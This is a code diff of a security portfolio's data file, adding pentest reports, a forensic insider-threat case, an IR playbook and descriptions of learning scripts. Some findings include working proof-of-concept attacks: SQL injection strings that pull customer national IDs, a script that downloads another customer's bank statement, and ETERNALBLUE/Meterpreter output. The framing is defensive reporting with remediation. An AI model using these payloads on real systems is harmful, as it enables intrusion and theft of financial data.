+# [+] 192.168.15.43:445 - ETERNALBLUE overwrite completed
+# [*] Meterpreter session 1 opened`,
       },
       {
         id: "f6",
-        title: "Default SNMP community strings",
+        title: "Default SNMP Community Strings on Network Devices",
         severity: "medium",
-        body: "Twelve network devices used the default 'public' SNMP v2 community string, leaking topology information.",
+        cvss: "5.3",
+        affected: "12 managed switches and routers across core and distribution layers",
+        body: "Twelve network devices (Cisco Catalyst switches and an HP router) were configured with the default SNMPv2 community string 'public' for read access. SNMP v2 transmits community strings in cleartext. Using these strings, an attacker with network access can enumerate the full network topology, ARP tables, routing tables, interface statistics, and device configurations.",
+        impact: "Full network topology disclosure. An attacker could map the internal network layout, identify high-value targets, and plan lateral movement routes without generating any notable log entries. Topology information dramatically reduces the reconnaissance phase of a targeted attack.",
+        remediation: "Change all SNMP community strings to randomised 20+ character values. Disable SNMP v2 and migrate to SNMPv3 with authentication and privacy (AES-128 minimum). Restrict SNMP access to dedicated management VLAN via ACL. Consider disabling SNMP entirely on devices where it is not actively used for monitoring.",
       },
       {
         id: "f7",
-        title: "Cleartext FTP on file-transfer server",
+        title: "Active Cleartext FTP Service on File-Transfer Server",
         severity: "low",
-        body: "An internal FTP server was still active for legacy integrations, transmitting credentials in plaintext.",
+        cvss: "3.7",
+        affected: "FTP-SRV-01 (Ubuntu 18.04) — 192.168.20.12, port 21",
+        body: "An FTP server (vsftpd 3.0.3) remained active on the file-transfer server for a legacy integration with a third-party vendor. FTP transmits both credentials and file content in cleartext. Wireshark capture on the same VLAN confirmed that authentication credentials were visible in packet captures during a test transfer.",
+        impact: "Any user with access to the internal VLAN can passively capture FTP credentials and file contents using a network tap or ARP spoofing. Credential capture could enable further access to the FTP server and any other services sharing the same password.",
+        remediation: "Migrate the legacy vendor integration to SFTP (SSH File Transfer Protocol) on port 22. If the vendor cannot support SFTP, use FTPS (FTP over TLS) as a compromise. Disable the plain FTP service (`systemctl disable vsftpd && systemctl stop vsftpd`) once the migration is complete. Audit whether the FTP credentials are reused on any other internal systems.",
       },
     ],
   },
@@ -1341,37 +1400,551 @@ export const securityReports: SecurityReport[] = [
     id: "r4",
     title: "Web App Pentest — FinTech Client Portal",
     type: "pentest",
+    teaser: "A date-range filter that broke SQL isolation. An API endpoint that let any user download any account's statements. Two critical flaws in a live financial portal.",
+    pdfUrl: "/projects_docs/Web%20Application%20Security.pdf",
+    target: "FinTech client-facing web portal (production) — account management, transaction history, and statement download flows",
+    scope: "Authenticated and unauthenticated attack surface of the customer-facing portal. Excludes mobile app API and internal admin panel (separate engagement).",
+    purpose: "Perform an authenticated penetration test of the FinTech client portal to assess OWASP Top 10 exposure, with particular focus on financial data access controls and transaction integrity.",
+    why: "Regulatory pressure from the Central Bank's cybersecurity framework required the client to conduct annual penetration tests of all customer-facing systems. The prior year's report had flagged authorisation controls as a concern — this engagement followed up with deeper testing of those specific areas.",
+    methodology: [
+      "Authenticated session analysis: captured all API requests during normal customer workflows using Burp Suite proxy to build a complete endpoint inventory.",
+      "Authorisation testing: created two test customer accounts (different customers, different statement datasets) and cross-tested all object references between them.",
+      "Input validation: automated Burp active scan against all identified endpoints; manually tested transaction filter parameters for injection vulnerabilities.",
+      "Transport security review: checked TLS configuration (testssl.sh), HSTS headers, cookie security flags, and CORS policy.",
+      "Session management: tested session fixation, token entropy, logout handling, and concurrent session controls.",
+    ],
+    tools: ["Burp Suite Pro", "testssl.sh", "sqlmap (validation)", "OWASP ZAP", "jwt_tool", "Postman"],
+    timeline: "4 business days",
+    outcome: "Identified 3 valid findings (1 critical, 1 high, 1 low). The SQL injection finding was the most severe — it allowed full database extraction via the transaction date filter with no authentication bypass required. All findings were remediated within 2 weeks of report delivery.",
+    lessonsLearned: [
+      "SQL injection in financial APIs is still distressingly common — raw query concatenation often persists in 'internal' or 'admin' endpoints that were deprioritised for security review.",
+      "BOLA/IDOR findings in financial systems require two test accounts with distinct, non-overlapping data sets — using a single account makes cross-customer access impossible to demonstrate clearly.",
+      "HSTS misconfiguration is trivial to fix but requires an explicit deployment step — it should be in the deployment checklist, not left to developers to remember.",
+      "sqlmap is useful for confirming SQL injection but its output is noisy and often over-reports; manual verification of the injection point is always worth doing before including it in a report.",
+      "Providing a 'risk-ordered' remediation table (not just CVSS-ordered) dramatically helps development teams prioritise — a critical finding in a low-traffic endpoint may be less urgent than a high finding in the main checkout flow.",
+    ],
     findings: [
       {
         id: "f8",
-        title: "SQL injection in transaction filter",
+        title: "SQL Injection in Transaction Date-Range Filter",
         severity: "critical",
-        body: "The date-range filter on /api/transactions passed user input directly to a raw SQL query, allowing full database extraction.",
+        cvss: "9.8",
+        affected: "GET /api/transactions?from=<date>&to=<date>",
+        body: "The `from` and `to` date parameters in the transaction history filter were concatenated directly into a raw SQL query without parameterisation. The application used string formatting to build the WHERE clause, and no input validation or WAF was in place for the API endpoint. Confirmed time-based blind SQLi via `SLEEP()` injection; escalated to UNION-based extraction to confirm full database read access.",
+        impact: "Full database read access without any privilege escalation. The database user had SELECT rights across all application tables including customer PII (name, address, national ID), account balances, full transaction histories, hashed passwords, and internal audit logs. Exploiting this vulnerability would constitute a notifiable data breach under applicable regulations.",
+        remediation: "Immediately switch to parameterised queries (prepared statements) for all database interactions — no string concatenation in SQL. Audit all other API endpoints for the same pattern. Apply principle of least privilege to the database user: the API account should have SELECT only on the tables it needs. Deploy a WAF rule targeting SQL keyword injection as a defence-in-depth measure (not a primary fix).",
+        poc: `# Step 1: Confirm time-based blind SQLi
+curl -s "https://portal.fintech-client.example/api/transactions?\\
+  from=2024-01-01' AND SLEEP(5)--&to=2024-12-31"
+# Response delays ~5 seconds → confirmed SQLi
+
+# Step 2: UNION-based extraction (DB version)
+# from=2024-01-01' UNION SELECT 1,version(),3,4,5--
+
+# Step 3: Extract customer table (simplified)
+# from=2024-01-01' UNION SELECT customer_id,email,full_name,
+#   national_id,account_number FROM customers LIMIT 10--
+
+# Parameterised query fix (Node.js / pg example):
+const result = await db.query(
+  'SELECT * FROM transactions WHERE date BETWEEN $1 AND $2',
+  [req.query.from, req.query.to]  // parameterised — safe
+);`,
       },
       {
         id: "f9",
-        title: "Broken object-level authorisation on statements",
+        title: "Broken Object-Level Authorisation on Statement Downloads",
         severity: "high",
-        body: "Authenticated users could enumerate other customers' monthly statements by iterating the statement_id path parameter.",
+        cvss: "8.1",
+        affected: "GET /api/statements/:statement_id/download",
+        body: "Authenticated customers could download monthly statements belonging to other customers by iterating the `statement_id` path parameter. The endpoint verified that the user was authenticated but did not verify that the requested statement belonged to the requesting user's account. Statement IDs were sequential integers starting from 1.",
+        impact: "Any authenticated customer could enumerate and download statements for all other customers. Monthly statements contain full transaction histories, account balances, and personal details. In a financial context, this is a serious breach of customer confidentiality and a regulatory violation.",
+        remediation: "Add an ownership check in the service layer: verify that the statement's account_id matches the authenticated user's account_id before returning any data. Replace sequential integer IDs with UUIDs on all customer-facing resources to eliminate enumeration as an attack vector. Add an automated BOLA test to the regression suite using two test accounts.",
+        poc: `# Two test accounts: user A (statement_id=4421), user B (statement_id=6800)
+# Logged in as user A:
+
+import requests, io
+
+token_a = "eyJhbGci..."  # valid token for user A
+
+# Access user B's statement — should be 403, returns 200
+r = requests.get(
+    "https://portal.fintech-client.example/api/statements/6800/download",
+    headers={"Authorization": f"Bearer {token_a}"},
+)
+print(r.status_code)          # 200 — confirms BOLA
+print(r.headers["Content-Type"])  # application/pdf
+with open("stolen_statement.pdf", "wb") as f:
+    f.write(r.content)`,
       },
       {
-        id: "f10",
-        title: "Missing HSTS on login subdomain",
+        id: "r4-f10",
+        title: "Missing HSTS Header on Login Subdomain",
         severity: "low",
-        body: "The login.client.example.com subdomain lacked Strict-Transport-Security, exposing sessions to downgrade attacks on hostile networks.",
+        cvss: "3.7",
+        affected: "https://login.portal.fintech-client.example",
+        body: "The login subdomain (`login.portal.fintech-client.example`) did not include a `Strict-Transport-Security` (HSTS) header. The main application domain had HSTS configured, but the login subdomain — deployed separately — was missed. On networks where an attacker can intercept traffic (public Wi-Fi, hostile network), this allows an SSL stripping attack to downgrade the HTTPS connection to HTTP.",
+        impact: "On a hostile network, an attacker performing SSL stripping could intercept customer credentials submitted on the login page over HTTP. While exploitation requires network-level access (not trivially achieved), the login page is the highest-value target and should have the strongest transport security.",
+        remediation: "Add `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to the login subdomain's server configuration. Verify HSTS is applied at the load balancer level, not just the application, to prevent subdomain gaps when deploying new services. Add to the deployment checklist.",
+      },
+    ],
+  },
+  {
+    id: "r5",
+    title: "Digital Forensics Investigation — Insider Threat",
+    type: "ir",
+    teaser: "847 confidential files left the building before the resignation email arrived. The registry, LNK files, and memory told the full story.",
+    pdfUrl: "/projects_docs/Forensic_Report.pdf",
+    target: "Windows workstation and file server — suspected insider data exfiltration",
+    scope: "Single Windows 10 endpoint and associated network shares; memory image, disk image, and Windows Event Logs.",
+    purpose: "Conduct a forensic investigation to determine whether a departing employee exfiltrated confidential files before their access was revoked, and to produce evidence suitable for HR proceedings.",
+    why: "The security team flagged unusual USB activity and large file transfers from an employee's workstation in the 72 hours before their resignation. A structured forensic investigation was needed to establish a timeline, identify what was taken, and preserve evidence.",
+    methodology: [
+      "Evidence acquisition: created forensic images of the target workstation's hard drive and captured a memory dump using FTK Imager. Hashes verified (SHA-256) and documented in chain of custody.",
+      "Timeline reconstruction: parsed Windows Event Logs (Security, System, Application) and Prefetch files to build a chronological activity timeline around the suspect period.",
+      "USB and removable media analysis: extracted USB device history from the Windows Registry (USBSTOR, MountedDevices) to identify all connected storage devices and their first/last connection timestamps.",
+      "File access analysis: examined $MFT records and LNK files to identify files accessed, copied, or deleted. Cross-referenced with the exfiltration timeframe.",
+      "Memory analysis: searched memory dump for running processes, network connections, and browser artifacts at the time of the incident using Volatility.",
+      "Report: produced a timestamped, evidence-referenced forensic report suitable for HR and legal review.",
+    ],
+    tools: ["FTK Imager", "Autopsy", "Volatility 3", "RegRipper", "Event Log Explorer", "ExifTool"],
+    timeline: "3 business days",
+    outcome: "Confirmed exfiltration of 847 files (including marked-confidential design documents and a client database export) to two USB devices and a personal Google Drive account. USB serial numbers identified. Timeline established: activity occurred across four sessions in the 48 hours before resignation. Findings were handed to legal counsel.",
+    lessonsLearned: [
+      "Chain of custody documentation is non-negotiable — even for internal investigations. Without it, evidence is inadmissible and the whole investigation can be challenged.",
+      "LNK files and Prefetch entries are often overlooked by non-technical staff performing cover-up attempts; they are frequently the most valuable forensic artifacts.",
+      "DLP controls that alert on large USB writes or cloud uploads would have flagged this in real time instead of requiring a reactive forensic investigation.",
+      "Memory analysis revealed a browser session that had already been deleted from disk — always capture memory early if the device is still running.",
+    ],
+    findings: [
+      {
+        id: "r5-f1",
+        title: "Confirmed File Exfiltration to USB Devices",
+        severity: "critical",
+        cvss: "9.1",
+        affected: "Windows 10 workstation — USB ports",
+        body: "Registry analysis (USBSTOR) identified two USB mass storage devices connected during the suspect window. MFT timestamp analysis and LNK files confirmed 847 files were accessed and copied to those devices, including files tagged as CONFIDENTIAL in their metadata.",
+        impact: "Loss of confidential design documents and a full client database export. Potential breach of NDA and data protection obligations. Regulatory notification may be required depending on the data classification of the client database.",
+        remediation: "Implement endpoint DLP with USB write blocking or at minimum alerting on large removable media writes. Apply mandatory egress monitoring for cloud storage uploads from corporate devices. Revoke removable media access for employees on notice periods.",
+      },
+      {
+        id: "r5-f2",
+        title: "Personal Cloud Drive Upload During Business Hours",
+        severity: "high",
+        cvss: "7.5",
+        affected: "Network egress — personal Google Drive",
+        body: "Memory analysis and browser artifacts revealed an authenticated personal Google Drive session during the same 48-hour window. Network proxy logs confirmed outbound HTTPS transfers to drive.google.com totalling approximately 1.2 GB.",
+        impact: "Secondary exfiltration channel independent of USB devices. Files transferred via cloud are outside the organisation's control and may be shared with third parties.",
+        remediation: "Block personal cloud storage services (Google Drive, Dropbox, OneDrive personal) at the proxy/firewall for corporate devices. Allow access only to corporate-sanctioned cloud storage with DLP inspection.",
+      },
+    ],
+  },
+  {
+    id: "r6",
+    title: "Incident Response Playbook — Ransomware & BEC",
+    type: "ir",
+    teaser: "No playbook, a flat network, and wire transfers approved by email alone. A single ransomware hit would have been unrecoverable — until now.",
+    pdfUrl: "/projects_docs/IR%20Playbook.pdf",
+    target: "Organisation-wide IR preparedness — playbook covering ransomware and business email compromise scenarios",
+    scope: "Endpoint infrastructure, email systems, cloud workloads, and backup/recovery procedures across the environment.",
+    purpose: "Develop a structured, step-by-step incident response playbook to guide the security team through ransomware and BEC incidents — from initial detection through containment, eradication, recovery, and post-incident review.",
+    why: "The organisation had no formal IR procedures documented. Tabletop exercises revealed that responders were improvising containment decisions under pressure, leading to inconsistent actions and delayed recovery. A written playbook was needed to reduce mean-time-to-contain.",
+    methodology: [
+      "Threat modelling: mapped the two highest-risk incident types (ransomware, BEC) to the MITRE ATT&CK framework to identify key detection and response decision points.",
+      "Playbook design: structured each playbook as: Trigger → Initial triage → Containment → Eradication → Recovery → Post-incident. Each step has clear owner, tool, and expected outcome.",
+      "SIEM alert mapping: documented which SIEM alerts (Wazuh rules) map to each playbook trigger to ensure consistent activation.",
+      "Communication templates: included pre-drafted stakeholder communication templates (executive briefing, regulatory notification draft, customer notice) to reduce pressure during live incidents.",
+      "Tabletop validation: ran two tabletop exercises against the playbooks with the security and IT teams; iterated based on gaps identified.",
+      "Metrics definition: defined KPIs for each playbook (MTTD, MTTC, MTTR) and documented measurement methodology.",
+    ],
+    tools: ["Wazuh SIEM", "Microsoft Defender", "Velociraptor", "TheHive", "Cortex", "Confluence (documentation)"],
+    timeline: "2-day drill: Day 1 (technical audit + simulation), Day 2 (recovery drill + debrief)",
+    outcome: "Delivered two production-ready playbooks covering 14 distinct response actions per scenario. Tabletop exercises demonstrated a 40% reduction in decision latency compared to unstructured response. Playbooks adopted as the organisation's official IR procedures.",
+    lessonsLearned: [
+      "The most valuable part of a playbook is not the steps themselves but the pre-authorised decision authority — knowing who can approve isolation of a production server without a 45-minute approval chain.",
+      "Ransomware containment depends almost entirely on network segmentation quality; a flat network turns a single infected endpoint into a full environment compromise within minutes.",
+      "BEC playbooks must include out-of-band verification procedures (phone call to the requestor) as a mandatory step — email-only verification is precisely what BEC exploits.",
+      "Running tabletops against the playbook before a real incident is the only reliable way to find gaps — paper reviews miss the coordination and communication failures that only appear under simulated pressure.",
+    ],
+    findings: [
+      {
+        id: "r6-f1",
+        title: "No Network Segmentation Between User and Server VLANs",
+        severity: "critical",
+        cvss: "9.0",
+        affected: "Flat internal network — all VLANs",
+        body: "During the tabletop ransomware simulation, it was identified that user workstation VLANs had unrestricted SMB access to all file servers. A simulated ransomware infection on one workstation would have lateral movement path to all shares within minutes via SMB relay or direct share encryption.",
+        impact: "In a real ransomware incident, this flat network topology would allow full file server encryption before detection or containment could occur. Recovery time would extend from hours to days.",
+        remediation: "Implement VLAN segmentation with explicit firewall rules between user and server segments. Block SMB (445) from user VLANs to server VLANs — require specific jump host access for administrative file operations. Validate segmentation with a purple team exercise.",
+      },
+      {
+        id: "r6-f2",
+        title: "Email Wire Transfer Requests Not Verified Out-of-Band",
+        severity: "high",
+        cvss: "7.8",
+        affected: "Finance team email workflow",
+        body: "Review of the finance team's payment authorisation process found that wire transfer requests arriving via email were approved based on email confirmation alone, without phone or in-person verification with the requestor. This is the primary enabler of Business Email Compromise fraud.",
+        impact: "Any successful email account compromise or domain spoofing attack targeting the finance team could result in fraudulent wire transfers. Average BEC loss is over $125,000 per incident.",
+        remediation: "Mandate out-of-band verification (phone call to a known number, not a number provided in the request email) for all wire transfers above a defined threshold. Implement DMARC/DKIM/SPF on all sending domains. Add BEC detection rules to the SIEM for lookalike domain patterns.",
       },
     ],
   },
 ];
 
+export const scripts: SecurityScript[] = [
+  {
+    id: "port-scanner",
+    title: "Multi-Threaded Port Scanner",
+    category: "recon",
+    shortDescription: "Fast TCP port scanner with banner grabbing, service detection, and configurable thread count — built with Python's ThreadPoolExecutor.",
+    purpose: "Scan a target host for open TCP ports, identify services running on each port, and attempt to grab service banners — all in parallel using a thread pool.",
+    why: "Understanding what ports and services are exposed on a network is the first step in any security assessment. Building this script from scratch teaches how port scanning works under the hood, rather than just running Nmap as a black box.",
+    how: "Uses Python's socket library to attempt TCP connections on each port. A ThreadPoolExecutor runs scans in parallel. For open ports it sends a probe string and reads the first 1024 bytes as a service banner. Results are printed in a formatted table.",
+    tech: ["Python", "socket", "ThreadPoolExecutor", "argparse"],
+    language: "python",
+    difficulty: "intermediate",
+    filename: "port_scanner.py",
+    code: "",
+    setupSteps: [
+      "Install Python 3.8+ — no third-party packages required.",
+      "Download port_scanner.py to your working directory.",
+      "Only scan hosts you own or have explicit permission to test.",
+    ],
+    usageExample: `python port_scanner.py 192.168.1.1
+python port_scanner.py 192.168.1.1 -p 1-65535 -t 100 --timeout 2.0
+python port_scanner.py scanme.nmap.org -p 80`,
+    replicationSteps: [
+      "Set up a local Linux VM as the scan target.",
+      "Start services on the VM: sudo systemctl start ssh apache2",
+      "Run: python port_scanner.py <vm-ip> -p 1-1024",
+      "Verify open ports match services. Compare with: nmap -sV <vm-ip>",
+    ],
+    lessonsLearned: [
+      "ThreadPoolExecutor reduces scan time dramatically — 1024 ports in under 3 seconds vs 60+ sequentially.",
+      "Banner grabbing is unreliable: many services don't respond to a generic probe. Real scanners use service-specific payloads.",
+      "TCP connect scanning completes the three-way handshake — it is noisy and easily logged by firewalls and IDS.",
+    ],
+    tags: ["port-scan", "network-recon", "tcp", "banner-grabbing", "multithreading"],
+  },
+  {
+    id: "web-security-scanner",
+    title: "Web Security Scanner",
+    category: "analysis",
+    shortDescription: "Audits a web target for missing security headers and tests common query parameters for reflected XSS with a curated payload list.",
+    purpose: "Perform a basic automated web security audit — checking for critical HTTP security headers and testing for reflected XSS in common query parameters.",
+    why: "Security headers and reflected XSS are two of the most common and easiest-to-find web vulnerabilities. Building this scanner teaches what automated tools do under the hood and what to look for during a web application pentest.",
+    how: "Sends an HTTP GET request to the target and inspects response headers against six critical security header names. Then tests common parameters (q, s, id, search) with eight XSS payloads and checks if the raw payload appears unencoded in the HTML response.",
+    tech: ["Python", "requests", "argparse", "HTTP headers", "XSS payloads"],
+    language: "python",
+    difficulty: "intermediate",
+    filename: "web_scanner.py",
+    code: "",
+    setupSteps: [
+      "Install dependencies: pip install requests",
+      "Only run against targets you own or intentionally vulnerable apps like DVWA or bWAPP.",
+    ],
+    usageExample: `python web_scanner.py http://192.168.1.100
+python web_scanner.py http://testphp.vulnweb.com`,
+    replicationSteps: [
+      "Set up DVWA locally: docker run -p 80:80 vulnerables/web-dvwa",
+      "Run: python web_scanner.py http://localhost",
+      "Check the header audit — DVWA deliberately lacks several security headers.",
+      "Test the XSS scan against DVWA's Reflected XSS page with security set to Low.",
+    ],
+    lessonsLearned: [
+      "Payload reflection in source does not guarantee execution — the browser's CSP or XSS protections may block it.",
+      "Security headers must be set at the load-balancer level to prevent subdomain gaps when deploying new services.",
+      "Many modern frameworks auto-add security headers; missing Content-Security-Policy is now a stronger finding than before.",
+    ],
+    tags: ["xss", "security-headers", "web-scan", "owasp", "csp", "reflected-xss"],
+  },
+  {
+    id: "osint-recon",
+    title: "OSINT Domain Recon",
+    category: "recon",
+    shortDescription: "Automates WHOIS lookups and Shodan host intelligence for a target domain and saves results to JSON.",
+    purpose: "Collect passive OSINT about a domain — registration details via WHOIS and exposed network infrastructure via Shodan — without sending any packets directly to the target.",
+    why: "Passive reconnaissance is always the first step in a pentest or threat-intelligence workflow. Understanding target exposure before active scanning helps prioritise effort and avoids triggering intrusion detection.",
+    how: "Prompts for a domain, queries WHOIS via python-whois, resolves the domain to an IP via the Shodan DNS API, then retrieves the full Shodan host record. All data is saved to osint_results.json for analysis.",
+    tech: ["Python", "python-whois", "Shodan API", "requests", "json"],
+    language: "python",
+    difficulty: "beginner",
+    filename: "OSINT_final.py",
+    code: "",
+    setupSteps: [
+      "Install dependencies: pip install python-whois requests",
+      "Get a free Shodan API key at https://account.shodan.io and replace the placeholder in the script.",
+      "Run: python OSINT_final.py and enter a domain when prompted.",
+    ],
+    usageExample: `python OSINT_final.py
+# Enter domain: example.com
+# Results saved to osint_results.json`,
+    replicationSteps: [
+      "Sign up for a free Shodan account and copy your API key.",
+      "Set your key in the script: SHODAN_API_KEY = 'your_actual_key'",
+      "Run against a domain you own or a bug-bounty target that allows OSINT.",
+      "Review osint_results.json for registered org, name servers, and exposed ports.",
+    ],
+    lessonsLearned: [
+      "WHOIS data is increasingly redacted under GDPR for privacy-proxy registrations — this is expected, not a script failure.",
+      "Shodan's free tier is rate-limited and may lack data for every IP — results depend on Shodan's last scan of the target.",
+      "Saving results to JSON immediately is good practice — OSINT data changes quickly and you need a timestamped snapshot.",
+    ],
+    tags: ["osint", "whois", "shodan", "recon", "passive-recon", "domain-intel"],
+  },
+  {
+    id: "forensic-carver",
+    title: "Digital Forensics File Carver",
+    category: "analysis",
+    shortDescription: "Recovers deleted JPEG, PNG, PDF, and GIF files from raw disk images using file signature (magic byte) matching with MD5 chain-of-custody logging.",
+    purpose: "Scan a binary disk image for known file headers and footers, carve out complete files, verify their integrity, compute MD5 hashes for evidence logging, and write a hashes.txt chain-of-custody report.",
+    why: "File carving is a core digital forensics skill. When a file is deleted its directory entry is removed but the data often remains on disk. Understanding how carvers work is essential for any DFIR role.",
+    how: "Reads the entire disk image into memory, then searches for each file type's magic bytes. For each header found it locates the matching footer, extracts the byte range, validates structure, writes the file to an output directory, and logs the MD5 hash.",
+    tech: ["Python", "hashlib", "binary analysis", "file signatures", "MD5"],
+    language: "python",
+    difficulty: "advanced",
+    filename: "forensic_carver.py",
+    code: "",
+    setupSteps: [
+      "Install Python 3.8+ — no third-party packages required.",
+      "Obtain or create a test disk image. 'dd' on Linux can create one from a USB drive.",
+      "Run: python forensic_carver.py",
+    ],
+    usageExample: `python forensic_carver.py
+# Carves files into output directory named after last_name variable
+# Generates hashes.txt with MD5 log for chain of custody`,
+    replicationSteps: [
+      "Create a test image: copy mixed images/PDFs to a FAT32 USB, then dd if=/dev/sdX of=test.img",
+      "Delete some files from the USB without wiping, then recreate the image.",
+      "Run the carver and verify it recovers the deleted files.",
+      "Cross-check MD5 hashes with known-good values to confirm integrity.",
+    ],
+    lessonsLearned: [
+      "Files do not disappear when deleted — they lose their directory pointer but the data remains until overwritten.",
+      "False positives are common: JPEG headers appear inside other formats. Header+footer integrity checks filter most of them.",
+      "A 50 MB carve limit per file prevents runaway extraction when a footer is missing — critical for corrupted disk images.",
+      "MD5 is the standard forensic chain-of-custody hash but should be paired with SHA-256 for adversarial contexts.",
+    ],
+    tags: ["digital-forensics", "file-carving", "md5", "disk-image", "evidence-recovery", "dfir"],
+  },
+  {
+    id: "malware-analyser",
+    title: "Static Malware Analyser",
+    category: "analysis",
+    shortDescription: "Performs static analysis on a binary — hex disassembly, obfuscation pattern detection, and embedded payload marker scanning.",
+    purpose: "Analyse a suspicious binary without executing it — extract pseudo-disassembled instructions from the hex representation, flag patterns associated with obfuscated shellcode, and detect embedded payload markers.",
+    why: "Static analysis is the safe first step for any suspected malware. You learn about the file contents without running it and risking infection. This script teaches the fundamentals: hex inspection, pattern matching, and structured reporting.",
+    how: "Reads the binary file, converts to a hex string, splits into 4-byte chunks labelled INSTR_XXXXXXXX. A regex flags instructions of all zeros (common padding/obfuscation). Also scans raw bytes for a PAYLOAD marker byte sequence.",
+    tech: ["Python", "binascii", "regex", "hex analysis"],
+    language: "python",
+    difficulty: "intermediate",
+    filename: "malware_final.py",
+    code: "",
+    setupSteps: [
+      "Install Python 3.8+ — no third-party packages required.",
+      "Obtain a sample binary for testing — any non-sensitive compiled binary works.",
+      "Run: python malware_final.py and enter the path when prompted.",
+    ],
+    usageExample: `python malware_final.py
+# Enter path: /samples/suspicious.exe
+# Output: disassembled instructions, obfuscation flags, payload detection`,
+    replicationSteps: [
+      "Create a test binary with known patterns using Python: open('test.bin','wb').write(b'\\x00'*8 + b'PAYLOAD' + b'\\xff'*8)",
+      "Run the analyser against test.bin — it should flag zero padding and detect the PAYLOAD marker.",
+      "Try against a benign binary (hello-world C program) to see what normal output looks like.",
+    ],
+    lessonsLearned: [
+      "This is a toy disassembler — real malware analysis requires Ghidra, IDA Pro, or Radare2 which understand CPU instruction sets.",
+      "The PAYLOAD marker is a deliberate lab exercise — real malware uses encrypted or encoded payloads with no readable markers.",
+      "Static analysis must always be paired with dynamic sandboxing for definitive conclusions about malicious behaviour.",
+    ],
+    tags: ["malware-analysis", "static-analysis", "binary", "obfuscation-detection", "hex"],
+  },
+  {
+    id: "finsecure-audit",
+    title: "FinSecure Compliance Auditor",
+    category: "analysis",
+    shortDescription: "Checks three compliance controls: sensitive directory permissions, active user session count, and disk space utilisation threshold.",
+    purpose: "Automate a basic compliance check — verify sensitive directories are not world-readable, active session count is within policy limits, and disk usage is below the 80% warning threshold.",
+    why: "Compliance audits repeat the same checks every cycle. Automating them saves time and ensures consistency. This script demonstrates lightweight audit automation a SOC analyst or sysadmin might run as a scheduled task.",
+    how: "Uses os.stat() to check POSIX permissions on the directory from FINSECURE_SENSITIVE_DIR env var, subprocess to run 'query user'/'who' for session count, and shutil.disk_usage() for disk utilisation percentage.",
+    tech: ["Python", "os", "stat", "subprocess", "shutil"],
+    language: "python",
+    difficulty: "beginner",
+    filename: "finsecure.py",
+    code: "",
+    setupSteps: [
+      "Install Python 3.8+ — no third-party packages required.",
+      "Optionally set FINSECURE_SENSITIVE_DIR to the path you want audited.",
+      "Run: python finsecure.py",
+    ],
+    usageExample: `python finsecure.py
+
+# Linux/Mac with custom directory:
+FINSECURE_SENSITIVE_DIR=/var/sensitive python finsecure.py
+
+# Windows PowerShell:
+$env:FINSECURE_SENSITIVE_DIR = "C:\\secure_data"; python finsecure.py`,
+    replicationSteps: [
+      "Linux: mkdir /tmp/test_secure && chmod 755 /tmp/test_secure",
+      "Set: export FINSECURE_SENSITIVE_DIR=/tmp/test_secure then run — should flag as non-compliant (group-readable).",
+      "Fix: chmod 700 /tmp/test_secure then re-run — should now pass.",
+      "Open several terminal sessions to verify the session count logic triggers correctly.",
+    ],
+    lessonsLearned: [
+      "Reading the sensitive directory from an environment variable rather than hardcoding it makes the script portable and follows the 12-factor app principle.",
+      "Windows uses ACLs instead of POSIX permission bits — os.stat() checks need a platform branch for cross-platform scripts.",
+      "Compliance scripts should produce machine-readable output (exit codes, JSON) for SIEM or CI pipeline integration.",
+    ],
+    tags: ["compliance", "audit", "file-permissions", "disk-space", "session-monitoring"],
+  },
+  {
+    id: "network-test-lab",
+    title: "Network Diagnostics Lab",
+    category: "recon",
+    shortDescription: "Enumerates local IPs, tests ICMP connectivity, resolves DNS, and lists all listening TCP/UDP ports with owning process names.",
+    purpose: "Provide a quick network health snapshot: what IPs are bound, which hosts are reachable, whether DNS resolves, and what processes are listening on the network.",
+    why: "Knowing your own network footprint is as important as knowing an attacker's. This is the kind of tool you run at the start of an incident response to quickly understand the baseline state of a machine.",
+    how: "Uses socket.getaddrinfo() for local IP enumeration, subprocess for OS ping, socket again for DNS resolution, and psutil.net_connections() to enumerate listening ports — enriched with process names from psutil.Process().",
+    tech: ["Python", "psutil", "socket", "subprocess", "platform"],
+    language: "python",
+    difficulty: "intermediate",
+    filename: "network_test_lab.py",
+    code: "",
+    setupSteps: [
+      "Install Python 3.8+ and psutil: pip install psutil",
+      "Run with administrator privileges (Windows: Run as Administrator / Linux: sudo).",
+      "Run: python network_test_lab.py",
+    ],
+    usageExample: `# Windows (admin PowerShell)
+python network_test_lab.py
+
+# Linux/Mac (sudo)
+sudo python3 network_test_lab.py
+
+# Output: LOCAL IPs / PING TEST / DNS RESOLUTION / LISTENING PORTS`,
+    replicationSteps: [
+      "Install psutil: pip install psutil",
+      "Run with admin rights and note listening ports.",
+      "In another terminal start a test server: python3 -m http.server 9000",
+      "Re-run and verify port 9000 now appears under TCP listeners.",
+    ],
+    lessonsLearned: [
+      "psutil abstracts OS-level socket enumeration cleanly — without it you'd parse 'netstat -an' output which varies across platforms.",
+      "Requiring admin rights for process-level port info is intentional — unprivileged users can list ports but not the owning process name.",
+      "DNS resolution failure (socket.gaierror) is one of the most common networking issues; a clear error message beats a raw traceback.",
+    ],
+    tags: ["network-diagnostics", "ping", "dns", "listening-ports", "psutil", "incident-response"],
+  },
+  {
+    id: "mobile-security-audit",
+    title: "Android ADB Security Audit",
+    category: "analysis",
+    shortDescription: "Uses Android Debug Bridge (ADB) to check for root access, enumerate installed apps, and list open network ports on a connected Android device.",
+    purpose: "Perform a quick security audit of a connected Android device via ADB — detecting root access, reviewing installed apps, and identifying open ports that may expose attack surface.",
+    why: "Mobile device security is often overlooked in enterprise environments. Rooted devices bypass Android's security model. This script shows how to automate basic mobile security checks as part of a BYOD policy audit.",
+    how: "Uses subprocess to invoke ADB commands. Checks for root via 'su -c id' and looks for uid=0. Retrieves package data via 'dumpsys package'. Lists open connections via 'netstat' on the device shell.",
+    tech: ["Python", "ADB", "subprocess", "Android"],
+    language: "python",
+    difficulty: "intermediate",
+    filename: "mobile_final.py",
+    code: "",
+    setupSteps: [
+      "Install Android SDK Platform Tools (includes ADB): https://developer.android.com/studio/releases/platform-tools",
+      "Enable USB Debugging: Settings → Developer Options → USB Debugging.",
+      "Connect device via USB and confirm with: adb devices",
+      "Run: python mobile_final.py",
+    ],
+    usageExample: `python mobile_final.py
+# Menu: 1=root check, 2=app check, 3=open ports, 4=all
+Enter your choice (1-4): 4`,
+    replicationSteps: [
+      "Enable USB debugging on an Android phone or Android Studio emulator.",
+      "Confirm with: adb devices — should show as 'device' not 'unauthorized'.",
+      "Run and choose option 4 for all checks.",
